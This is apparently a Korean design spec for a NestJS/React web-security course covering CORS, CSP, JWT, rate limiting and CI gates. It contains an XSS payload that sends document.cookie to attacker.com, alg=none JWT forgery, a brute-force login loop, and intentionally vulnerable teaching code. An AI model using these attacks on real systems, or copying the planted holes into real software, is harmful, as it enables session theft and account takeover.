# Security Lecture Suite — 학습 프로젝트 설계서

> **For agentic workers:** 이 spec을 기반으로 `superpowers:writing-plans` 스킬로 구현 플랜을 작성하세요.

---

## Context

웹 보안의 7대 통증을 NestJS BE + React/Vite FE 토글로 점진 시연한다. 핵심 원칙: **브라우저가 직접 막히거나 통과하는 장면**을 학습자가 눈으로 본다. 각 챕터는 이전 챕터의 한계로 등장하며, `x-security-status` 응답 헤더가 현재 챕터의 보안 상태를 한 줄로 가시화한다.

---

## 핵심 학습 목표

1. CORS는 서버가 허용해야 동작한다 — 브라우저는 막을 뿐, 정책 결정자는 서버다.
2. Preflight는 OPTIONS + `Max-Age` 캐시로 비용을 0에 수렴시킨다.
3. 인증쿠키는 명시적 origin + `Allow-Credentials` + `credentials: 'include'` 3박자가 동시에 맞아야 한다.
4. CSP `default-src 'self'`만으로 인라인 XSS의 절반이 막힌다 — 그러나 도메인 화이트리스트는 폭발한다.
5. Strict CSP(Nonce + `strict-dynamic`)가 실무 기본값이다.
6. JWT는 알고리즘 강제·짧은 TTL·payload 정제 없이는 안전하지 않다.
7. 공격 표면 축소(rate limit + UUID + Helmet + `x-powered-by` 제거)는 명시적 정책이다.
8. CI 보안 게이트(4-eyes·dep-scan·롤백)가 있어야 사고가 사고로 끝난다.

---

## 대상 학습자

- NestJS 기본 DI/Module 알고 있음
- TypeScript 기본 가능
- REST API 작성 경험 있음
- 브라우저 DevTools(Network/Console 탭) 활용 가능

---

## 기술 스택

| 패키지 | 버전 | 역할 | 챕터 |
|--------|------|------|------|
| NestJS | ^11.x | 기반 프레임워크 | 전 챕터 |
| `helmet` | ^8.x | CSP/보안 헤더 일괄 | Ch03~Ch06 |
| `@nestjs/throttler` | ^6.x | rate limiting | Ch06 |
| `@nestjs/jwt` | ^10.x | JWT 발급/검증 | Ch05~ |
| `bcrypt` | ^5.x | 비밀번호 해싱 | Ch05 |
| `uuid` | ^11.x | UUID v7 PublicId | Ch06 |
| React 18 + Vite 7 | (기존) | 검증용 FE | Ch01~Ch06 |
| `@faker-js/faker` | ^10.x | 결정론적 시드 | 전 챕터 |
| **삭제**: `@apollo/server`, `@nestjs/apollo`, `@nestjs/graphql`, `dataloader`, `graphql` | — | GraphQL 잔재 | — |

---

## 도메인 모델

```typescript
// libs/mock-data/src/domain.ts
export interface User {
  id: number;
  publicId: string;      // Ch06+ UUID v7, URL 노출용
  name: string;
  email: string;
  passwordHash: string;  // Ch05+ bcrypt
  createdAt: string;
}

export interface Product {
  id: number;
  name: string;
  priceInWon: number;
  description: string;   // Ch03: XSS 주입 대상 필드
  createdAt: string;
}

export type OrderStatus = 'PENDING' | 'SHIPPED' | 'DELIVERED' | 'CANCELLED';

export interface Order {
  id: number;
  userId: number;
  status: OrderStatus;
  items: OrderItem[];
}

export interface OrderItem {
  productId: number;
  quantity: number;
  unitPriceInWon: number;
}
```

---

## 프로젝트 디렉토리 구조

```
db-with-nestjs/  (worktree: .worktrees/security/, branch: feat/security-lecture-suite)
├── apps/
│   ├── lecture/src/
│   │   ├── app.module.ts
│   │   ├── main.ts
│   │   ├── common/
│   │   │   └── security-status.interceptor.ts
│   │   ├── ch01-cors-block/
│   │   │   ├── ch01.module.ts
│   │   │   └── products.controller.ts
│   │   ├── ch02-preflight-storm/
│   │   │   ├── ch02.module.ts
│   │   │   ├── orders.controller.ts        (PUT 트리거용)
│   │   │   └── session.controller.ts       (credentialed 시연)
│   │   ├── ch03-xss-open-door/
│   │   │   ├── ch03.module.ts
│   │   │   ├── products.controller.ts      (description 에코)
│   │   │   └── csp-report.controller.ts    (POST /_csp/report)
│   │   ├── ch04-allowlist-bloat/
│   │   │   ├── ch04.module.ts
│   │   │   ├── products.controller.ts
│   │   │   └── nonce.middleware.ts         (요청마다 nonce 생성)
│   │   ├── ch05-jwt-forge/
│   │   │   ├── ch05.module.ts
│   │   │   ├── auth.controller.ts
│   │   │   ├── auth.service.ts
│   │   │   ├── jwt.strategy.ts
│   │   │   └── users.controller.ts
│   │   ├── ch06-attack-surface/
│   │   │   ├── ch06.module.ts
│   │   │   ├── auth.controller.ts          (throttle 적용)
│   │   │   └── users.controller.ts         (publicId 기반 URL)
│   │   └── ch07-supply-chain-pain/
│   │       └── ch07.module.ts              (CI 학습용 — 코드 최소)
│   └── web/src/
│       ├── active-chapter.ts
│       ├── lib/
│       │   ├── api-client.ts
│       │   └── security-debug.tsx          (x-security-status 배지)
│       ├── ch01-cors-block/AttemptCallPanel.tsx
│       ├── ch02-preflight-storm/
│       │   ├── PreflightProbe.tsx
│       │   └── CredentialedProbe.tsx
│       ├── ch03-xss-open-door/InlineScriptPanel.tsx
│       ├── ch04-allowlist-bloat/StrictCspProbe.tsx
│       ├── ch05-jwt-forge/LoginForm.tsx
│       └── ch06-attack-surface/RateLimitProbe.tsx
│
├── libs/mock-data/src/
│   ├── domain.ts
│   └── seed.ts
│
└── .github/workflows/
    └── security-gate.yml
```

---

## 공통 학습 보조 장치

### 측정 장치 — `x-security-status` 응답 헤더

`SecurityStatusInterceptor`가 매 응답에 챕터별 토큰 부착. `main.ts`의 `exposedHeaders`에 등록해야 FE JS에서 읽을 수 있다.

| Ch | 헤더 값 | 의미 |
|----|---------|------|
| 01a | `cors=blocked` | Allow-Origin 부재 — 브라우저 차단 |
| 01b | `cors=allowed,origin=http://localhost:5173` | 정확한 origin 허용 |
| 02a | `preflight=fresh` | Max-Age=0, OPTIONS 매번 발생 |
| 02a | `preflight=cached(86400s)` | OPTIONS 캐시됨 |
| 02b | `credentials=missing-header` | Allow-Credentials 없음 |
| 02b | `credentials=allowed,origin=explicit` | 3박자 충족 |
| 03 | `csp=off` | CSP 미설정 — 인라인 스크립트 실행됨 |
| 03 | `csp=report-only,violations=N` | 위반 카운트만 기록 |
| 04 | `csp=enforced,nonce=on,strict-dynamic=on` | 화이트리스트 0개 |
| 05 | `jwt=weak-secret` | secret이 짧아 brute force 가능 |
| 05 | `jwt=alg-locked,exp=300s,verified` | 위조 시도 → 401 |
| 06 | `ratelimit=5/60s,id=uuid,fingerprint=stripped` | 공격 표면 닫힘 |
| 07 | `gate=approved,cve=0` | CI 통과 시그널 |

### 챕터 토글
- **BE**: `app.module.ts`에서 `ChXXSecurityModule` 하나만 import.
- **FE**: `active-chapter.ts`의 `ACTIVE_CHAPTER` 상수 변경.

---

## 챕터 상세 설계

---

### Ch01: CORS 미설정 → 브라우저 차단 (`ch01-cors-block/`)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| 안티패턴 시연 | **BE** | `app.enableCors()` 미호출 |
| 차단 확인 | **FE** | `fetch(cross-origin)` → 콘솔 에러 관찰 |
| 해결 | **BE** | `enableCors({ origin: ... })` 추가 |

#### 왜 이 문제가 생기는가

브라우저는 **Same-Origin Policy(SOP)** 를 기본으로 구현한다. FE(`http://localhost:5173`)에서 BE(`http://localhost:3000`)를 호출하면 포트가 달라 **다른 origin**이다. 브라우저는 요청 시 `Origin: http://localhost:5173` 헤더를 자동으로 붙이고, 응답에 `Access-Control-Allow-Origin`이 없거나 값이 불일치하면 응답 본문을 JS에 노출하지 않는다.

> **핵심 오해**: 서버는 200을 정상 응답한다. curl도 정상이다. **브라우저만** 차단한다.

#### CORS 트리거 조건 — Simple Request

이 챕터는 **Simple Request** 만 다룬다. 다음 조건을 모두 만족하면 preflight 없이 직접 요청이 전송된다:

| 조건 항목 | Simple Request 허용 값 |
|----------|----------------------|
| HTTP 메서드 | `GET`, `HEAD`, `POST` 중 하나 |
| Content-Type | `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data` 중 하나 |
| 커스텀 헤더 | 없음 |

> `Content-Type: application/json`은 Simple Request가 **아니다** → Ch02 Preflight 대상.

#### HTTP 교환 (안티패턴)

```
[FE] fetch('http://localhost:3000/products')
→ Request:
    GET /products HTTP/1.1
    Origin: http://localhost:5173        ← 브라우저 자동 추가

[BE] 응답:
    HTTP/1.1 200 OK
    Content-Type: application/json
    # Access-Control-Allow-Origin 없음  ← 여기가 문제

[Browser] → "No 'Access-Control-Allow-Origin' header is present" → JS에 차단
```

#### HTTP 교환 (해결 후)

```
[BE] app.enableCors({ origin: 'http://localhost:5173' })

[BE] 응답:
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: http://localhost:5173  ← 추가됨
    Vary: Origin

[Browser] → origin 일치 확인 → JS에 데이터 전달 ✅
```

#### `enableCors` 옵션 — `origin`의 모든 형태

```typescript
// 단일 origin
app.enableCors({ origin: 'http://localhost:5173' });

// 다중 origin 배열
app.enableCors({ origin: ['http://localhost:5173', 'https://prod.example.com'] });

// 정규식 (서브도메인 모두 허용)
app.enableCors({ origin: /\.example\.com$/ });

// 와일드카드 — credentials 포함 요청에 사용 불가
app.enableCors({ origin: '*' });

// true: 요청의 Origin 값을 그대로 반사 (개발 환경 편의용)
app.enableCors({ origin: true });
```

#### FE 구현 — `AttemptCallPanel.tsx`

1. 버튼 클릭 → `fetch('http://localhost:3000/products')` 호출
2. 성공: 상품 목록 + `x-security-status` 헤더 값 표시
3. 실패: "CORS 차단됨 — 콘솔을 확인하세요" 안내 + `curl` 명령어 힌트 표시
4. 주석: "curl과 비교해 보세요. curl은 CORS를 모른다 — 브라우저만 SOP를 구현한다."

#### 시연

```bash
# BE Ch01a (enableCors 없음) + FE 실행
pnpm start:dev && pnpm start:web
# → 브라우저: '불러오기' 버튼 클릭
# → 콘솔: "Access to fetch at 'http://localhost:3000/products' from origin
#          'http://localhost:5173' has been blocked by CORS policy"

# curl은 정상 (CORS는 브라우저 개념임을 증명)
curl -H "Origin: http://localhost:5173" -i http://localhost:3000/products
# → 200 OK, 응답 본문 정상, Access-Control-Allow-Origin 헤더 없음

# BE Ch01b (enableCors({ origin: '...' }) 추가 후 재시작) → 브라우저 재시도 → 성공
```

---

### Ch02a: Preflight 폭풍 (`ch02-preflight-storm/` — Part 1)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| Preflight 유발 | **FE** | `PUT` + `Authorization` 헤더 포함 요청 |
| OPTIONS 처리 | **BE** | `methods`, `allowedHeaders`, `maxAge` 설정 |
| 캐시 효과 확인 | **FE** | 같은 요청 5회 반복 → Network 탭 OPTIONS 횟수 관찰 |

#### Preflight 트리거 조건

Simple Request 조건을 하나라도 벗어나면 브라우저는 실제 요청 전에 `OPTIONS` 메서드로 사전 확인을 한다:

| 항목 | Preflight 유발 조건 |
|------|-------------------|
| HTTP 메서드 | `PUT`, `DELETE`, `PATCH` |
| Content-Type | `application/json` ← **자주 놓치는 부분** |
| 커스텀 헤더 | `Authorization`, `X-Custom-*` 등 |

> `fetch(url, { headers: { 'Content-Type': 'application/json' } })`만 해도 preflight 발생.

#### HTTP 교환 — Preflight 전체 흐름

```
# 1단계: Preflight (브라우저가 자동 전송)
OPTIONS /orders/42 HTTP/1.1
Origin: http://localhost:5173
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization

# 서버 응답 (올바른 설정)
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: GET, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400             ← 이 시간 동안 OPTIONS 재전송 생략

# 2단계: 실제 요청 (Preflight 통과 후)
PUT /orders/42 HTTP/1.1
Origin: http://localhost:5173
Authorization: Bearer eyJ...
Content-Type: application/json
```

#### `enableCors` 옵션 — Preflight 관련

```typescript
app.enableCors({
  origin: 'http://localhost:5173',
  methods: ['GET', 'HEAD', 'PUT', 'PATCH', 'POST', 'DELETE'],  // 허용 메서드
  allowedHeaders: ['Content-Type', 'Authorization'],            // 허용 커스텀 헤더
  maxAge: 86400,          // preflight 캐시 시간(초) — 0이면 매번 OPTIONS
  exposedHeaders: ['x-security-status'],  // FE JS에서 읽을 수 있는 응답 헤더
  preflightContinue: false,               // OPTIONS를 NestJS가 자동 완결
  optionsSuccessStatus: 204,              // OPTIONS 응답 상태코드
});
```

#### 측정 시나리오

```typescript
// FE PreflightProbe.tsx — 같은 PUT 5회 반복
for (let i = 0; i < 5; i++) {
  await fetch('http://localhost:3000/orders/42', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer test' },
    body: JSON.stringify({ status: 'SHIPPED' }),
  });
}
```

| maxAge 설정 | OPTIONS 요청 수 | 학습 포인트 |
|------------|---------------|-------------|
| `maxAge: 0` | 5/5 | 매 요청마다 preflight 라운드트립 |
| `maxAge: 86400` | 1/5 | 첫 번째만, 이후 캐시 활용 |

**시연**: Network 탭 `OPTIONS` 필터 → 횟수 직접 확인.

---

### Ch02b: Credentialed Request 미스매치 (`ch02-preflight-storm/` — Part 2)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| 쿠키 포함 요청 | **FE** | `credentials: 'include'` |
| 자격증명 허용 | **BE** | `credentials: true` + 명시적 origin |
| 실패 시연 | **BE** | `origin: '*'` + `credentials: true` — 표준 위반 |

#### 왜 Wildcard + Credentials가 안 되는가

보안 표준상 쿠키/인증 정보를 포함하는 요청에 `Access-Control-Allow-Origin: *`은 허용되지 않는다. 공격자가 임의 사이트에서 인증된 요청을 유도할 수 있기 때문.

#### HTTP 교환 — 실패 (wildcard)

```
[FE] fetch(url, { credentials: 'include' })   ← 쿠키 포함

[BE] app.enableCors({ origin: '*', credentials: true })

[BE 응답]
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Credentials: true

[Browser] → 에러:
  "The value of the 'Access-Control-Allow-Origin' header in the response
   must not be the wildcard '*' when the request's credentials mode is 'include'"
```

#### HTTP 교환 — 성공 (3박자 충족)

```
[FE] fetch(url, { credentials: 'include' })   ① 클라이언트 설정

[BE] app.enableCors({
  origin: 'http://localhost:5173',             ② 명시적 origin
  credentials: true,                           ③ Allow-Credentials: true
})

[BE 응답]
  Access-Control-Allow-Origin: http://localhost:5173
  Access-Control-Allow-Credentials: true
  Vary: Origin

[Browser] → 쿠키 포함 응답 허용 ✅
```

#### 3박자 체크리스트

| # | 위치 | 설정 | 없으면 |
|---|------|------|--------|
| ① | FE | `credentials: 'include'` (fetch) / `withCredentials: true` (axios) | 쿠키가 요청에 포함 안 됨 |
| ② | BE | `origin: '명시적URL'` (wildcard `*` 금지) | 브라우저가 응답 차단 |
| ③ | BE | `credentials: true` | 브라우저가 응답 차단 |

---

### Ch03: 인라인 스크립트로 XSS 무방비 (`ch03-xss-open-door/`)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| 취약점 시연 | **FE** | 사용자 입력을 raw HTML로 DOM에 삽입 |
| CSP 헤더 설정 | **BE** | `helmet.contentSecurityPolicy()` |
| 위반 수집 | **BE** | `POST /_csp/report` 엔드포인트 |
| 측정 | **FE** | `x-security-status: csp=report-only,violations=N` 배지 |

#### 공격 시나리오

**배경**: 쇼핑몰 상품 설명 입력란에 악성 코드를 삽입한다. 다른 사용자가 상품 페이지를 열면 코드가 실행돼 세션 쿠키를 외부 서버로 전송하거나 악성 URL로 리디렉션한다.

```
공격자가 상품 description 필드에 입력:
  <img src=x onerror='this.style.display="none";
    var x=document.createElement("img");
    x.src="https://attacker.com/steal?session="+document.cookie;
    document.body.appendChild(x)'>

일반 사용자가 상품 페이지를 열면:
  → img src 로드 실패 → onerror 핸들러 실행
  → 세션 쿠키가 attacker.com으로 전송됨
```

#### 무엇을 막는가 — CSP 지시문별 역할

| CSP 지시문 | 차단 대상 | 허용 |
|-----------|---------|------|
| `default-src 'self'` | 외부 origin의 모든 리소스 | 같은 origin만 |
| `script-src 'self'` | 인라인 `<script>` 태그, 이벤트 핸들러(`onerror`, `onload` 등) | 같은 origin의 .js 파일만 |
| `img-src 'self' data:` | 외부 이미지 URL (외부 서버 ping에 악용되는 패턴) | 같은 origin + data URI |
| `connect-src 'self'` | `fetch(외부URL)`, XHR to 외부 | 같은 origin만 |
| `report-uri /_csp/report` | 차단 대신 위반 보고 POST | — |

> `script-src 'self'`만 설정해도 `onerror="..."` 인라인 이벤트 핸들러는 **차단**된다.

#### CSP-Report-Only vs Enforce

```typescript
// Ch03: Report-Only (위반만 기록, 실제 실행은 허용)
helmet.contentSecurityPolicy({
  reportOnly: true,
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    imgSrc: ["'self'", 'data:'],
    connectSrc: ["'self'"],
    reportUri: ['/_csp/report'],
  },
});
// 결과: 인라인 스크립트 실행됨, 콘솔에 "Refused to..." 경고 + /_csp/report에 POST

// Ch04로 넘어갈 때: Enforce (위반 차단)
helmet.contentSecurityPolicy({
  reportOnly: false,    // ← 이 한 줄만 변경
  directives: { /* 동일 */ },
});
// 결과: 인라인 스크립트 실행 차단
```

#### 위반 보고 HTTP 흐름

```
[BE → FE 응답 헤더 (Ch03, Report-Only)]
Content-Security-Policy-Report-Only:
  default-src 'self'; script-src 'self'; img-src 'self' data:; report-uri /_csp/report

[브라우저가 위반 보고 전송]
POST /_csp/report
{
  "csp-report": {
    "document-uri": "http://localhost:5173/products",
    "violated-directive": "script-src-elem",
    "blocked-uri": "inline",
    "line-number": 12,
    "source-file": "http://localhost:5173/products"
  }
}

[BE] violations 카운터 증가 → x-security-status 업데이트
```

#### 구현 포인트

- `csp-report.controller.ts`: `POST /_csp/report` → in-memory 카운터
- `products.controller.ts`: `GET /products` → `description` 필드 에코 (입력을 그대로 반환하는 취약점 시연용)
- **FE 안티패턴**: `InlineScriptPanel.tsx`에서 입력값을 `textContent` 대신 raw HTML로 삽입 — 학습용 단일 함수, "이 패턴은 학습용이며 production 코드에서는 절대 사용 금지" 주석 필수
- **FE 정상 흐름**: 같은 컴포넌트에 `textContent` 사용 버전을 나란히 렌더링해 비교

---

### Ch04: 화이트리스트 폭발 → Strict CSP (`ch04-allowlist-bloat/`)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| 화이트리스트 모드 | **BE** | `script-src` 도메인 나열 |
| Nonce 생성 | **BE** | 요청마다 `crypto.randomBytes(16)` |
| Nonce 주입 | **BE + FE** | `<script nonce="...">` — NestJS SSR 또는 Vite plugin |
| 측정 | **FE** | 도메인 수 N→0 표시, 외부 스크립트 로드 성공/실패 |

#### 공격 시나리오 1 — 화이트리스트 폭발

프로젝트가 성장하며 3rd-party 스크립트가 누적된다:

```
1개월차 — GA 추가:
  script-src 'self' https://www.google-analytics.com

2개월차 — Sentry 추가:
  script-src 'self' https://www.google-analytics.com https://browser.sentry-cdn.com

3개월차 — Stripe 추가:
  script-src 'self' ... https://js.stripe.com

문제 1: 목록 관리가 실수에 의존
문제 2: 목록에 있는 도메인이 침해당하면 우리 정책도 무력화됨
문제 3: Stripe.js가 2차로 로드하는 https://m.stripe.com/ 은 목록에 없어 차단됨
        → 또 정책 수정 + 재배포 필요
```

#### 공격 시나리오 2 — Nonce로 해결

```
# 서버가 요청마다 새 nonce 생성
nonce = "abc123xyz"  (crypto.randomBytes(16).toString('base64'))

# CSP 헤더 (도메인 목록 없음)
Content-Security-Policy:
  script-src 'nonce-abc123xyz' 'strict-dynamic';

# HTML
<script nonce="abc123xyz" src="/app.js"></script>  ← 실행됨 (nonce 일치)
<script src="https://evil.com/x.js"></script>       ← 차단 (nonce 없음)
<script>alert("xss")</script>                       ← 차단 (nonce 없음)
```

#### `strict-dynamic`이 필요한 이유

```
# app.js (nonce 있음 → 신뢰됨)
const s = document.createElement('script');
s.src = 'https://js.stripe.com/v3/';
document.head.appendChild(s);

# strict-dynamic 없으면: https://js.stripe.com이 목록에 없어 차단됨
# strict-dynamic 있으면: 신뢰받은 스크립트(app.js)가 추가한 스크립트도 자동 신뢰
```

#### `frame-ancestors`가 필요한 이유 — Clickjacking

```
공격자 사이트:
  <p>이벤트 응모하기</p>
  <iframe src="http://victim.com/account/transfer"
    style="opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%">

사용자: "응모하기" 버튼을 클릭했다고 생각하지만
실제로는: 투명 iframe 안의 "송금 확인" 버튼을 클릭함

해결: frame-ancestors 'self'
  → 우리 페이지는 우리 도메인에서만 iframe으로 삽입 가능
```

#### `upgrade-insecure-requests` 효과

```
# HTTPS 페이지에서 HTTP 리소스 로드 → Mixed Content 경고/차단
<img src="http://cdn.example.com/logo.png">

# upgrade-insecure-requests 지시문 설정 시:
# 브라우저가 모든 http:// 요청을 자동으로 https:// 로 업그레이드
# 코드 수정 없이 Mixed Content 해결
```

#### CSP 옵션 전체 비교

| 옵션 | 사용 시점 | Ch03 | Ch04 |
|------|---------|------|------|
| `default-src 'self'` | 항상 — 폴백 | ✅ | ✅ |
| `script-src 'self'` | 인라인 스크립트 차단 | ✅ | — (nonce로 대체) |
| `script-src 'nonce-X' 'strict-dynamic'` | 동적 스크립트 신뢰 | — | ✅ |
| `img-src 'self' data:` | 외부 이미지 로드 제한 | ✅ | ✅ |
| `connect-src 'self'` | 외부 API 호출 제한 | ✅ | ✅ |
| `frame-ancestors 'self'` | clickjacking 방지 | — | ✅ |
| `upgrade-insecure-requests` | Mixed Content 해결 | — | ✅ |
| `reportOnly: true` | 위반 기록만 | ✅ | — |
| `reportOnly: false` | 실제 차단 | — | ✅ |

#### Nonce 구현 패턴

```typescript
// nonce.middleware.ts
import { Injectable, NestMiddleware } from '@nestjs/common';
import { randomBytes } from 'crypto';

@Injectable()
export class NonceMiddleware implements NestMiddleware {
  use(req: any, res: any, next: () => void) {
    res.locals.nonce = randomBytes(16).toString('base64');
    next();
  }
}

// main.ts (Ch04)
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        (req: any, res: any) => `'nonce-${res.locals.nonce}'`,
        "'strict-dynamic'",
      ],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'self'"],
      upgradeInsecureRequests: [],
    },
  }),
);
```

#### 시연 비교

```bash
# 화이트리스트 모드 활성 시
curl -i http://localhost:3000/products | grep 'content-security-policy'
# script-src 'self' https://www.google-analytics.com https://browser.sentry-cdn.com ...

# Strict 모드 활성 시
curl -i http://localhost:3000/products | grep 'content-security-policy'
# script-src 'nonce-abc123xyz' 'strict-dynamic'; frame-ancestors 'self'
```

| 모드 | `script-src` 도메인 수 | 새 3rd-party 추가 비용 |
|------|----------------------|----------------------|
| Whitelist | 5+ (점점 증가) | 정책 수정 + 서버 재시작 |
| Strict (Nonce) | 0 | 없음 |

---

### Ch05: JWT 위조 (`ch05-jwt-forge/`)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| 로그인/토큰 발급 | **BE** | `POST /auth/login` |
| 위조 시도 | **FE + 외부 도구** | jwt.io에서 헤더 `alg` 변조 후 재사용 |
| 검증 강화 | **BE** | 알고리즘 강제, 강 secret, 짧은 TTL |

#### 공격 시나리오 — `alg=none` 위조

```
정상 JWT:
  헤더: { "alg": "HS256", "typ": "JWT" }
  페이로드: { "sub": 1, "email": "user@x.com", "role": "user" }
  서명: HMAC-SHA256(헤더.페이로드, secret)

jwt.io에서 변조:
  헤더: { "alg": "none" }                     ← 알고리즘 제거
  페이로드: { "sub": 1, "role": "admin" }      ← 권한 승격
  서명: (제거)

서버가 헤더에서 alg를 읽어 동적 처리하면:
  alg=none → 서명 없음 → 검증 건너뜀 → 위조 토큰 통과 ← 취약점
```

#### 안티패턴 vs 해결책

```typescript
// ❌ 안티패턴: 알고리즘을 헤더에서 추출해 동적으로 결정하는 구조
// (실제 라이브러리에서 old 버전 허용 방식 — 개념 설명용)

// ✅ 해결: 서버가 알고리즘을 코드에서 명시적으로 고정
JwtModule.register({
  secret: process.env.JWT_SECRET,    // 256bit+ 랜덤 값
  signOptions: {
    algorithm: 'HS256',
    expiresIn: '5m',
  },
});

// 검증 시 허용 알고리즘 명시 필수
jwt.verify(token, secret, {
  algorithms: ['HS256'],   // none, RS256 등 다른 알고리즘 거부
});
```

#### JWT 보안 체크리스트

| 항목 | 안티패턴 | 해결 | 시연 방법 |
|------|---------|------|---------|
| 알고리즘 | 동적 추출 허용 | `algorithms: ['HS256']` 강제 | 위조 토큰 → 401 |
| Secret | `"secret"` (4바이트) | `crypto.randomBytes(32).toString('base64')` | jwt.io 디코딩으로 비교 |
| TTL | 무한 | `expiresIn: '5m'` | 5분 후 토큰 재사용 → 401 |
| Payload | 민감 정보 포함 | `{ sub, email, role }`만 | jwt.io 디코딩으로 노출 확인 |

---

### Ch06: 공격 표면 축소 (`ch06-attack-surface/`)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| Rate limit | **BE** | `@nestjs/throttler` |
| UUID ID | **BE** | `User.publicId` + URL 변경 |
| 보안 헤더 | **BE** | `helmet()` |
| 핑거프린팅 제거 | **BE** | `app.disable('x-powered-by')` |

#### 공격 시나리오 1 — Brute Force 로그인

```bash
# 공격자: 비밀번호 목록으로 무한 시도
for pw in $(cat passwords.txt); do
  curl -s -X POST localhost:3000/auth/login \
    -d "{\"email\":\"victim@x.com\",\"password\":\"$pw\"}" \
    -H "Content-Type: application/json"
done
# 해결: 5회 실패 → 60초 차단 (HTTP 429)
```

#### 공격 시나리오 2 — IDOR (순차 ID 추측)

```bash
# 공격자: /users/1, /users/2, /users/3 순서대로 접근
curl localhost:3000/users/1   # → 다른 사용자 개인정보 노출
curl localhost:3000/users/2
curl localhost:3000/users/3

# 해결: URL에 UUID v7 사용 (추측 불가)
curl localhost:3000/users/01HXYZ-...uuid-v7   # 내 publicId면 200
curl localhost:3000/users/01HABC-...other      # 타인 publicId → 403
curl localhost:3000/users/1                    # 숫자 ID → 404
```

#### 공격 시나리오 3 — 핑거프린팅

```bash
curl -i localhost:3000/products | grep -i 'x-powered'
# 안티패턴: X-Powered-By: Express
# → 공격자가 "Express 기반이니 Express 취약점을 노린다" 판단 가능
# 해결: 헤더 없음 — app.disable('x-powered-by')
```

#### 공격 시나리오 4 — MIME Sniffing

```
서버가 Content-Type을 잘못 보내도 (예: text/html로 JS 파일 서빙)
X-Content-Type-Options: nosniff 없으면 브라우저가 내용을 분석해 JS로 실행
→ 공격자가 업로드한 이미지 파일을 브라우저가 스크립트로 실행할 수 있음

해결: helmet()이 자동으로 X-Content-Type-Options: nosniff 추가
```

#### Helmet 적용 헤더 목록

```typescript
app.use(helmet());
// 자동 적용되는 헤더:
// X-Content-Type-Options: nosniff           (MIME sniffing 방지)
// X-Frame-Options: SAMEORIGIN               (clickjacking 방지)
// Referrer-Policy: no-referrer              (리퍼러 정보 숨김)
// X-DNS-Prefetch-Control: off
// Cross-Origin-Embedder-Policy: require-corp
// Cross-Origin-Opener-Policy: same-origin

app.disable('x-powered-by');  // Express 스택 정보 제거
```

#### 시연

```bash
# 1. Brute force (5+회 시도)
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST localhost:3000/auth/login \
    -d '{"email":"u@x.com","password":"wrong"}' -H "Content-Type: application/json"
done
# 출력: 401 401 401 401 401 429 429 429 429 429

# 2. IDOR
curl -i localhost:3000/users/1               # 404
curl -i localhost:3000/users/<uuid-v7>       # 403 (타인) 또는 200 (본인)

# 3. 보안 헤더 확인
curl -i localhost:3000/products | grep -iE 'x-powered|x-content-type|x-frame|referrer'
```

---

### Ch07: 공급망 / 배포 결함 (`ch07-supply-chain-pain/`)

#### 담당자

| 역할 | 담당 | 내용 |
|------|------|------|
| dep-scan | **CI (GitHub Actions)** | `pnpm audit --audit-level=high` |
| 4-eyes 머지 | **GitHub 브랜치 보호** | Required reviewers + CODEOWNERS |
| 롤백 | **scripts** | `scripts/rollback.mjs` |
| BE 코드 | **BE** | 최소 — Ch07은 CI/프로세스 학습이 주제 |

#### 공격 시나리오 1 — Self-Approve 머지

```
PR 작성자 == 승인자
→ 악성 코드 또는 보안 취약점이 리뷰 없이 main에 합병됨

해결:
  브랜치 보호 규칙: Required approvals: 1
  CODEOWNERS: 본인 PR 자기 승인 불가
```

#### 공격 시나리오 2 — CVE 미감지 의존성

```bash
# 검토 없이 취약 버전 설치
pnpm add lodash@4.17.20  # Prototype Pollution 취약점 포함

# 해결: CI에서 사전 차단
pnpm audit --audit-level=high
# → "Found 1 high severity vulnerability → CI 실패 → merge 불가"
```

#### 공격 시나리오 3 — 롤백 불가

```bash
# 사고 발생:
# "지금 당장 되돌려야 하는데 어떻게 하죠?"
# → 절차 없음, 수동 복구 → 다운타임 증가

# 해결: rollback 스크립트 + CI tag
pnpm run rollback --to=v20260428120000
# → git revert <merge-sha> + 이전 태그 체크아웃 + 빌드 + 재시작
```

#### CI 워크플로

```yaml
# .github/workflows/security-gate.yml
name: Security Gate
on:
  pull_request:
    branches: [feat/db-lecture-suite]
  push:
    branches: [feat/db-lecture-suite]

jobs:
  audit:
    name: Dependency Audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - run: pnpm audit --audit-level=high   # high CVE → 실패

  build:
    name: Build & Test
    needs: audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - run: pnpm install --frozen-lockfile
      - run: pnpm build
      - run: pnpm test --passWithNoTests
      - name: Tag release
        if: github.ref == 'refs/heads/feat/db-lecture-suite'
        run: |
          TAG="v$(date +%Y%m%d%H%M%S)"
          git tag $TAG
          git push origin $TAG
```

---

## 챕터 간 비교 가이드

| 챕터 | `x-security-status` | 핵심 차이 |
|---|---|---|
| 01a | `cors=blocked` | Allow-Origin 없음 |
| 01b | `cors=allowed,origin=http://localhost:5173` | 한 줄 추가 |
| 02a(before) | `preflight=fresh` | OPTIONS 5/5 |
| 02a(after) | `preflight=cached(86400s)` | OPTIONS 1/5 |
| 02b(fail) | `credentials=missing-header` | wildcard + credentials |
